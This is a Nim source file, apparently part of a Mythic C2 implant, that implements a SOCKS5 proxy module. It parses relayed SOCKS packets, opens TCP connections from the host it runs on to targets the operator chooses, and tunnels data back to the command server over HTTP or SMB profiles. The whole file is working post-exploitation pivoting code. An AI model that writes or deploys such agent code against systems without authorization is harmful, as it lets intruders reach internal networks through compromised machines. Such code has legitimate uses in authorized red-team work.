import std/endians
import std/options
import std/tables
import std/net
from nativesockets import Port
import json
import locks
import ../structs
import ../utils
import ../b64

when defined(PROFILE_SMB):
  import ../profiles/smb as profile
else:
  import ../profiles/http as profile

# Globla Hashmap for looking up active connections
var openSocksConnections: Table[int, (bool, Socket)]
var hmLock: Lock
initLock(hmLock)

type
  SocksResponseCode = enum
    SuccessReply          = 0
    ServerFailure         = 1
    RuleFailure           = 2
    NetworkUnreachable    = 3
    HostUnreachable       = 4
    ConnectionRefused     = 5
    TtlExpired            = 6
    CommandNotSupported   = 7
    AddrTypeNotSupported  = 8

  AddrType = enum
    IPv4 = 1,
    Domain = 3,
    IPv6 = 4

  SocksCommand = enum
    SetupTCP = 1,
    OpenTCP = 2,
    UDPRedirection = 3

  SocksPacket = object
    version: byte
    command: SocksCommand
    reserved: byte
    addrType: AddrType
    address: seq[byte]
    addressStr: string
    port: uint16

  SocksResponse = object
    version: byte
    responseCode: SocksResponseCode
    reserved: byte
    addrType: AddrType
    address: seq[byte]
    port: uint16


#[
 for turning an seq[] or array into a string
]#
proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

#[
  parse the IPV4 addr from an byte array
]#
proc parseIP(bytes: openarray[byte]): string =
  if len(bytes) != 4:
    DBG("[-] Wrong length, not never happen")
    return ""
  result = $bytes[0] & "." & $bytes[1] &  "." & $bytes[2] & "." & $bytes[3]


#[
To format the incoming parsed SOCKS packets
-> super horrible code, but only for debuggign tho
]#
when defined(debug):
  proc `$`(pkt: SocksPacket): string =

    var tmp = ""

    if pkt.addrType == AddrType.Domain:
      tmp = "Remote Host: [" & $pkt.command & "] " & pkt.address.toString() & ":" & $pkt.port
    else:
      tmp = "Remote Host: [" & $pkt.command & "] " & pkt.address.parseIP() & ":" & $pkt.port

    let versionStr = "Socks Version: " & $pkt.version

    var longestLine = len(tmp)
    var lenBox = longestLine + 4 # 2 more on each site

    var topline = "\n"
    topline &= "+"
    for i in 0..<lenBox:
      topline &= "-"
    topline &= "+\n"

    result &= topline
    result &= "|  " & versionStr

    for i in 0..<longestLine - len(versionStr):
      result &= " "
    result &= "  |\n"
    result &= "|  " & tmp & "  |\n"
    result &= topline


#[
  Converts a `SocksResponse` struct to a byte string
]#
proc toByteStr(pkt: SocksResponse): seq[byte] =

  result  = newSeq[byte]()

  result.add(pkt.version)
  result.add(cast[byte](pkt.responseCode))
  result.add(pkt.reserved)
  result.add(cast[byte](pkt.addrType))
  # add the length of the domain,
  # if this is choosen
  if pkt.addrType == AddrType.Domain:
    result.add(cast[byte](len(pkt.address)))
  result = result & pkt.address

  # convert cshort to big endian byte
  # string:

  #DBG($pkt.port)
  var b1 = cast[byte](pkt.port and 0xFF)
  var b2 = cast[byte]((pkt.port shr 8) and 0xFF)
  #DBG("PORT DEBUGGING")
  #DBG($b1)
  #DBG($b2)

  result.add(b1)
  result.add(b2)


#[
  craft a new socks response struct, fill that with the requests information such as:
  - the server_id for mythic
  - Tell mythic if the connection is terminated (exit)

  create byte array and return SocksMsg
]#
proc newSocksResponse(socksReq: SocksPacket, respCode: SocksResponseCode, serverId: int, exit=false): TaskResponse =

  let resp = SocksResponse(
      version: 5,
      addrType: socksReq.addrType,
      address: socksReq.address,
      responseCode: respCode
    )

  let sMsg = SocksMsg(
    exit: exit,
    server_id: serverId,
    data: b64.encode(Base64Pad, resp.toByteStr())
  )

  result = TaskResponse(
    action: "post_response",
    responses: @[],
    socks: some(@[sMsg])
  )



#[

  A socks packet is structured in
  the following way:

  [ Version   ] # 1 Byte
  [ Command   ] # 1 Byte
  [ Reserved  ] # 1 Byte (0x00)
  [ Addr.Type ] # 1 Byte (0x1 = IPv4, 0x3=Domain, 0x4=Ipv6)
  [ Address   ] # Depends on the Type
                # IPv4 = 4 Byte, Domain = 1 Byte-Length + Domain, IPv6= 16 Byte
  [ Port      ] # 2-Byte, Big Endian

]#
proc parsePacket*(data: string): Option[SocksPacket] =

  if data == "":
    return none(SocksPacket)

  var
    pktData = b64.decode(Base64Pad, data)
    idx = 0
    pkt =  SocksPacket()

  # must have a minimum of 7 bytes of data
  if len(pktData) <= 7:
    return none(SocksPacket)

  pkt.version = pktData[0]
  pkt.command = cast[SocksCommand](pktData[1])
  pkt.addrType = cast[AddrType](pktData[3])

  if pkt.addrType == AddrType.Ipv4:
    pkt.address = pktData[4..<4+4]
    idx += 8
    pkt.addressStr = pkt.address.parseIP()
  elif pkt.addrType == AddrType.Ipv6:
    pkt.address = pktData[4..<4+16]
    idx += 20
  elif pkt.addrType == AddrType.Domain:
    let domainLength = cast[int](pktData[4])
    pkt.address = pktData[5..4+domainLength]
    idx += (domainLength + 4 + 1) # 1 size byte + domain + prev.bytes
    pkt.addressStr = pkt.address.toString

  swapEndian16(addr pkt.port, addr pktData[idx])

  return some(pkt)



#[
  Goes through all connections and receives data
  from the remote socket. This happens in the
  regular agent sleep interval.
  -> Lower sleep, faster processing
]#
proc processActiveConnections*(con: ConnectionInformation) =


  #[
    Go through all active sockets/connections and receive
    data in until no more is available.
    If something is received, send it back to Mythic
  ]#
  for server_id, (isCon, socket) in openSocksConnections.mpairs():

    # if its no connected, go to the next one
    if not isCon:
      continue

    var
      fullout: string
      output = "-" # must be nonempty to begin with
      sockClosed = false

    DBG("\t[*] Reading for socket: " & $server_id)

    # loop through until either the socket
    # gets closed (output = "") or the exception
    # hits  (timeout / OSError)
    while output != "":
      try:
        let output = socket.recv(1, timeout=300)
        if output == "":
          sockclosed = true
          break
        fullout &= output
      except:
        break

    # if the socket connection is closed
    # note that in the table to not loop over
    # the socket again
    if sockClosed:
      isCon = false
      socket.close()


    # send to answer back to the socks client
    let msg = SocksMsg(exit: sockClosed, server_id: server_id, data: b64.encode(Base64Pad, cast[seq[byte]](fullout)))

    let resp = %* TaskResponse(
      action: "post_response",
      responses: @[],
      socks: some(@[msg])
    )

    discard sendAndRetrData(resp)

  # remove all entries where the connection was closed
  # to save some loop time
  var toDel: seq[int]
  for serverId in openSocksConnections.keys():
    # if not connected, remove that entry
    if not openSocksConnections[serverid][0]:
      toDel.add(serverId)

  for sid in toDel:
    openSocksConnections.del(sid)


#[
  this is the first function that handles all incoming
  socks packets and does:

  1) If the connection to that server_id exists, handle the data as data
  2) parse the packet (socks5)

]#
proc processDatagram*(con: ConnectionInformation, item: SocksMsg) =

  if  item.server_id in openSocksConnections:
    # that means, that socket is already connected and we can start sending the
    # date to the socket
    if openSocksConnections[item.server_id][0] and len(item.data) > 0:

      try:
        openSocksConnections[item.server_id][1].send(cast[string](b64.decode(Base64Pad, item.data)))
      except OSError:
        DBG("[-] An error occured when sending msg, removing connectivity")
        openSocksConnections[item.server_id][0]  = false

      # if we have send the data, there is nothing more to do
      return

  # regular parsing action
  var packet = parsePacket(item.data)


  # DEBUGGING
  if packet.isSome:
    var pktCont = packet.get()
    DBG($pktCont)


  if packet.isSome:

    #[
      This block is answered if the Command is _NOT_ SetupTCP,
      as all other SOCKS commands are currently not implemented
      yet. This will craft a new SocksResponse, that
    ]#
    if packet.get().command != SocksCommand.SetupTCP:

      # create the response (CommandNotSupported + Exit to Mythic)
      let resp = %* newSocksResponse(packet.get(), SocksResponseCode.CommandNotSupported, item.server_id, true)

      # Send the Command to the server and leave the processing
      DBG("[*] Send `CommandNotSupported` to Myhthic Server")
      discard sendAndRetrData(resp)
      return
    else:

      # the regular processing, for the SetupTCP Command
      hmLock.acquire()

      # The real processing
      if item.server_id in openSocksConnections:
        # already in there, continue the connection
        DBG("[*] Identified open connection -> sending Data")

        if item.exit:
          openSocksConnections.del(item.server_id)
          DBG("[+] Deleted Server Connection " & $item.server_id)



      else:
        openSocksConnections[item.server_id] = (false, newSocket(buffered=true))
        if packet.isSome:

          try:

            #DBG(fmt"[*] Connect to {packet.get().addressStr}:{packet.get().port} [Server ID: {item.server_id}]")
            # Using connect() instead of dial() for the timeout parameter
            openSocksConnections[item.server_id][1].connect(packet.get().addressStr, Port(packet.get().port), timeout=500)

            # Set the connection to established
            openSocksConnections[item.server_id][0] = true

            # Craft the Answer Packet - Connection Successfull
            let resp = %* newsocksresponse(packet.get(), SocksResponseCode.SuccessReply, item.server_id, false)

            # send the command to the server and leave
            # the processing
            DBG("[+] Send `SuccessConnection` to myhthic server")
            discard sendandretrdata(resp)
            return

          except:
            # return a error and tell mythic to exit the connection
            let resp = %* newsocksresponse(packet.get(), SocksResponseCode.HostUnreachable, item.server_id, true)

            # send the command to the server and leave
            # the processing
            DBG("[-] Failed to Connect, Send `HostUnreachable` to myhthic server")
            discard sendandretrdata(resp)


      hmLock.release()

  else:
    #[
      This block gets executed if the data is none
      aka, that means that its only  a  exit:true
      condition
    ]#
    DBG("[*] Connection closed by mythic, removing from table")
    if item.exit:
      withLock(hmLock):
        if item.server_id in openSocksConnections:
          openSocksConnections.del(item.server_id)

          var socksResp = SocksMsg(
              exit: true,
              server_id: item.server_id,
              data: ""
          )
          var resp = %*TaskResponse(
              action: "post_response",
              responses: @[],
              socks: some(@[socksResp])
          )
          discard sendAndRetrData(resp)

          DBG("[+] Deleted Server Connection " & $item.server_id)








